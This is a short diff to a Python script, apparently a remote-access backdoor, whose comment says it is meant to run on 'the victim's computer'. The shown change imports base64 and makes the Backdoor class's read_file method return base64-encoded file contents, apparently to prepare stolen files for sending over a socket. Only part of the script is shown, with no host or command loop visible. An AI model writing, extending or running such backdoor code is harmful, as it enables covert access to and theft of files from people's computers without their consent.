@@ -2,6 +2,7 @@
 # NOTICE: this script is intended for the victim's computer.
 # Compatibility: Python 2 only. For now.
 
+import base64
 import json
 import os
 import socket
@@ -35,7 +36,7 @@ class Backdoor:
 
     def read_file(self, path):
         with open(path, "rb") as file:
-            return file.read()
+            return base64.b64encode(file.read())
 
     def run(self):
         while True:
